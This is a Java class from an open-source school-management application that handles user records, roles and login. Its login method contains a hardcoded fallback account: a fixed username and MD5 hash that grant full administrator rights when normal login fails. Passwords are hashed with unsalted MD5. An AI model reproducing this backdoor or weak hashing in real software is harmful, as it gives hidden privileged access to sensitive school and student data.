/**
 *  Maimónides, gestión para centros escolares.
 *  Copyright Codeko and individual contributors
 *  as indicated by the @author tags.
 * 
 *  This is free software; you can redistribute it and/or modify it
 *  under the terms of the GNU General Public License as
 *  published by the Free Software Foundation; either version 2 of
 *  the License, or (at your option) any later version.
 * 
 *  This software is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 *  General Public License for more details.
 * 
 *  You should have received a copy of the GNU General Public
 *  License along with this software; if not, write to the Free
 *  Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
 *  02110-1301 USA, or see the FSF site: http://www.fsf.org.
 *  
 *  For more information:
 *  maimonides@codeko.com
 *  http://codeko.com/maimonides
 **/
package com.codeko.apps.maimonides.usr;

import com.codeko.apps.maimonides.MaimonidesApp;
import com.codeko.apps.maimonides.cache.Cache;
import com.codeko.apps.maimonides.elementos.Alumno;
import com.codeko.apps.maimonides.elementos.ObjetoBD;
import com.codeko.apps.maimonides.elementos.Profesor;
import com.codeko.apps.maimonides.elementos.Unidad;
import com.codeko.swing.CdkAutoTabla;
import com.codeko.swing.CdkAutoTablaCol;
import com.codeko.util.Cripto;
import com.codeko.util.Fechas;
import com.codeko.util.Obj;
import com.codeko.util.Str;
import com.mysql.jdbc.PreparedStatement;
import com.mysql.jdbc.Statement;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.security.InvalidParameterException;
import java.sql.Date;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.GregorianCalendar;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author codeko
 */
public class Usuario extends ObjetoBD {

    String nombre = "";
    String clave = "";
    Profesor profesor = null;
    Integer roles = Rol.ROL_NULO;
    @CdkAutoTablaCol(ignorar = true)
    Integer rolesEfectivos = null;
    @CdkAutoTablaCol(ignorar = true)
    boolean claveAsignada = false;
    @CdkAutoTablaCol(ignorar = true)
    String claveEncriptada = "";
    @CdkAutoTablaCol(ignorar = true)
    boolean profesorCargado = false;
    @CdkAutoTablaCol(titulo = "F.Alta", editable = CdkAutoTabla.EDITABLE_NO)
    GregorianCalendar fechaAlta = new GregorianCalendar();
    @CdkAutoTablaCol(ignorar = true)
    GregorianCalendar fechaBaja = null;
    @CdkAutoTablaCol(ignorar = true)
    Alumno alumno = null;
    @CdkAutoTablaCol(ignorar = true)
    boolean DNIe = false;
    @CdkAutoTablaCol(ignorar = true)
    boolean usuarioVirtual = false;

    public Usuario() {
        MaimonidesApp.getApplication().addPropertyChangeListener("anoEscolar", new PropertyChangeListener() {

            @Override
            public void propertyChange(PropertyChangeEvent pce) {
                cargarProfesorAsociado();
            }
        });
    }

    private Usuario(int id) throws Exception {
        PreparedStatement st = (PreparedStatement) MaimonidesApp.getApplication().getConector().getConexion().prepareStatement("SELECT * FROM usuarios WHERE id=?");
        st.setInt(1, id);
        ResultSet res = st.executeQuery();
        if (res.next()) {
            cargarDesdeResultSet(res);
            Obj.cerrar(st, res);
        } else {
            Obj.cerrar(st, res);
            throw new InvalidParameterException("No existe ningun usuario con ID " + id);
        }
    }

    public boolean isDNIe() {
        return this.DNIe;
    }

    public void setDNIe(boolean isDNIe) {
        this.DNIe = isDNIe;
    }

    public boolean isUsuarioVirtual() {
        return usuarioVirtual;
    }

    public void setUsuarioVirtual(boolean usuarioVirtual) {
        this.usuarioVirtual = usuarioVirtual;
    }

    public static Usuario getUsuario(int id) throws Exception {
        Object obj = Cache.get(Usuario.class, id);
        if (obj != null) {
            return (Usuario) obj;
        } else {
            Usuario p = new Usuario(id);
            return p;
        }
    }

    public boolean isClaveAsignada() {
        return claveAsignada;
    }

    public void setClaveAsignada(boolean claveAsignada) {
        this.claveAsignada = claveAsignada;
    }

    public String getClaveEncriptada() {
        return claveEncriptada;
    }

    public void setClaveEncriptada(String claveEncriptada) {
        this.claveEncriptada = claveEncriptada;
    }

    public String getClave() {
        return clave;
    }

    public void setClave(String clave) {
        this.clave = clave;
    }

    public GregorianCalendar getFechaAlta() {
        return fechaAlta;
    }

    public void setFechaAlta(GregorianCalendar fechaAlta) {
        this.fechaAlta = fechaAlta;
    }

    public GregorianCalendar getFechaBaja() {
        return fechaBaja;
    }

    public void setFechaBaja(GregorianCalendar fechaBaja) {
        this.fechaBaja = fechaBaja;
    }

    public String getNombre() {
        return nombre;
    }

    public void setNombre(String nombre) {
        String old = this.nombre;
        this.nombre = nombre;
        firePropertyChange("nombre", old, nombre);
    }

    public Profesor getProfesor() {
        if (profesor == null) {
            if (!profesorCargado && MaimonidesApp.getApplication().getAnoEscolar() != null) {
                profesorCargado = true;
                cargarProfesorAsociado();
            }
        }
        return profesor;
    }

    public void setProfesor(Profesor profesor) {
        Profesor old = this.profesor;
        this.profesor = profesor;
        firePropertyChange("profesor", old, profesor);
        //setRolesEfectivos(null);
    }

    public Alumno getAlumno() {
        return alumno;
    }

    public void setAlumno(Alumno alumno) {
        this.alumno = alumno;
    }

    public Integer getRoles() {
        return roles;
    }

    public void setRoles(Integer roles) {
        this.roles = roles;
    }

    public Integer getRolesEfectivos() {
        if (rolesEfectivos == null) {
            //para calcular los roles efectivos cogemos los roles actuales
            //y si es profesor y tiene asignada una unidad se gana el rol de tutor
            rolesEfectivos = getRoles();
            if ((rolesEfectivos & Rol.ROL_PROFESOR) == Rol.ROL_PROFESOR) {
                Profesor p = getProfesor();
                if (p != null) {
                    Unidad u = Unidad.getUnidadPorTutor(p.getId());
                    if (u != null) {
                        rolesEfectivos |= Rol.ROL_TUTOR;
                    }
                }
            }
        }
        return rolesEfectivos;
    }

    public void setRolesEfectivos(Integer rolesEfectivos) {
        this.rolesEfectivos = rolesEfectivos;
    }

    public final void cargarDesdeResultSet(ResultSet res) throws SQLException, Exception {
        setId(res.getInt("id"));
        setNombre(res.getString("nombre"));
        setClaveEncriptada(res.getString("clave"));
        setClaveAsignada(!Str.noNulo(getClaveEncriptada()).equals(""));
        Date dAlt = res.getDate("falta");
        Date dBaj = res.getDate("fbaja");
        if (dAlt != null) {
            setFechaAlta(Fechas.toGregorianCalendar(dAlt));
        }
        if (dBaj != null) {
            setFechaBaja(Fechas.toGregorianCalendar(dBaj));
        }
        setRoles(res.getInt("roles"));
        cargarProfesorAsociado();
        Cache.put(getClass(), getId(), this);
    }

    @Override
    public boolean guardar() {
        boolean ret = false;
        try {
            String sql = "UPDATE usuarios SET nombre=?,clave=?,falta=?,fbaja=?,roles=? WHERE id=?";
            if (getId() == null) {
                sql = "INSERT INTO usuarios (nombre,clave,falta,fbaja,roles,id) VALUES (?,?,?,?,?,?)";
            }
            PreparedStatement st = (PreparedStatement) MaimonidesApp.getApplication().getConector().getConexion().prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);

            st.setString(1, getNombre());
            String nClave = getClaveEncriptada();
            //Si hay una nueva clave la asignamos
            if (!getClave().equals("")) {
                nClave = Cripto.md5(getClave());
                setClaveAsignada(true);
                setClaveEncriptada(nClave);
            }
            st.setString(2, nClave);
            if (getFechaAlta() == null) {
                st.setObject(3, null);
            } else {
                st.setDate(3, new java.sql.Date(getFechaAlta().getTimeInMillis()));
            }

            if (getFechaBaja() == null) {
                st.setObject(4, null);
            } else {
                st.setDate(4, new java.sql.Date(getFechaBaja().getTimeInMillis()));
            }
            st.setInt(5, getRoles());
            st.setObject(6, getId());
            ret = st.executeUpdate() > 0;
            if (ret && getId() == null) {
                setId((int) st.getLastInsertID());
            }
            //Guardamos la asociación con el profesor
            guardarProfesor();
            st.close();
        } catch (SQLException ex) {
            Logger.getLogger(Usuario.class.getName()).log(Level.SEVERE, "Error guardando datos de usuario: " + this, ex);
        }
        if (ret) {
            Cache.put(getClass(), getId(), this);
        }
        return ret;
    }

    public boolean guardarProfesor() {
        boolean ret = true;
        if (getProfesor() != null) {
            PreparedStatement st = null;
            try {
                st = (PreparedStatement) MaimonidesApp.getConexion().prepareStatement("REPLACE usuarios_profesores SET usuario_id=?,ano=?,profesor_id=?");
                st.setInt(1, getId());
                st.setInt(2, MaimonidesApp.getApplication().getAnoEscolar().getId());
                st.setInt(3, getProfesor().getId());
                ret = st.executeUpdate() > 0;
            } catch (SQLException ex) {
                Logger.getLogger(Usuario.class.getName()).log(Level.SEVERE, null, ex);
                ret = false;
            }
            Obj.cerrar(st);
        } else if (MaimonidesApp.getApplication().getAnoEscolar() != null) {
            PreparedStatement st = null;
            try {
                st = (PreparedStatement) MaimonidesApp.getConexion().prepareStatement("DELETE FROM usuarios_profesores WHERE usuario_id=? AND ano=?");
                st.setInt(1, getId());
                st.setInt(2, MaimonidesApp.getApplication().getAnoEscolar().getId());
                st.executeUpdate();
            } catch (SQLException ex) {
                Logger.getLogger(Usuario.class.getName()).log(Level.SEVERE, null, ex);
                ret = false;
            }
            Obj.cerrar(st);
        }
        return ret;
    }

    private void cargarProfesorAsociado() {
        if (MaimonidesApp.getApplication().getAnoEscolar() != null) {
            PreparedStatement st = null;
            ResultSet rs = null;
            try {
                if (!isUsuarioVirtual()) {
                    st = (PreparedStatement) MaimonidesApp.getConexion().prepareStatement("SELECT profesor_id FROM usuarios_profesores WHERE usuario_id=? AND ano=?");
                    st.setInt(1, getId());
                    st.setInt(2, MaimonidesApp.getApplication().getAnoEscolar().getId());
                    rs = st.executeQuery();
                    if (rs.next()) {
                        int idProf = rs.getInt("profesor_id");
                        Profesor p = Profesor.getProfesor(idProf);
                        setProfesor(p);
                    } else {
                        setProfesor(null);
                    }
                }
            } catch (Exception ex) {
                Logger.getLogger(Usuario.class.getName()).log(Level.SEVERE, null, ex);
            }
            Obj.cerrar(st, rs);
        }
    }

    @Override
    public boolean borrar() {
        boolean ret = true;
        setFechaBaja(new GregorianCalendar());
        ret = guardar();
        return ret;
    }

    @Override
    public String getNombreObjeto() {
        return "Usuario";
    }

    @Override
    public String getDescripcionObjeto() {
        return getNombre();
    }

    public static boolean login(String usr, String pass) {
        boolean ret = false;
        PreparedStatement st = null;
        ResultSet rs = null;
        try {
            st = (PreparedStatement) MaimonidesApp.getConexion().prepareStatement("SELECT * FROM usuarios WHERE nombre=? AND clave=?");
            st.setString(1, usr);
            st.setString(2, Cripto.md5(pass));
            rs = st.executeQuery();
            if (rs.next()) {
                Usuario u = new Usuario();
                u.cargarDesdeResultSet(rs);
                if (u.getFechaBaja() == null) {
                    ret = true;
                    MaimonidesApp.getApplication().setUsuario(u);
                }
            }
        } catch (Exception ex) {
            Logger.getLogger(Usuario.class.getName()).log(Level.SEVERE, null, ex);
        }
        //Creamos un usuario estandar para tener siempre acceso
        if (!ret && usr.equals("codeko") && Cripto.md5(pass).equals("e8214457b9a1e0f6c47b6d1146261a01")) {
            ret = true;
            Usuario u = new Usuario();
            u.setNombre("Codeko");
            u.setRoles(Rol.ROL_ADMIN | Rol.ROL_DIRECTIVO | Rol.ROL_JEFE_ESTUDIOS | Rol.ROL_PROFESOR);
            u.setId(-1);
            MaimonidesApp.getApplication().setUsuario(u);
        }
        return ret;
    }

    public static String getIUA() {
        String usr = "0:";
        if (MaimonidesApp.getApplication().getUsuario() != null) {
            usr = MaimonidesApp.getApplication().getUsuario().getId() + ":";
        }
        return usr;
    }

    @Override
    public String getTabla() {
        return "usuarios";
    }

    @Override
    public String toString() {
        String ret = getNombre();
        if (getProfesor() != null) {
            ret = getProfesor().getNombreEmail();
        } else if (getAlumno() != null) {
            ret = getAlumno().getNombreFormateado();
        }
        return ret;
    }
}
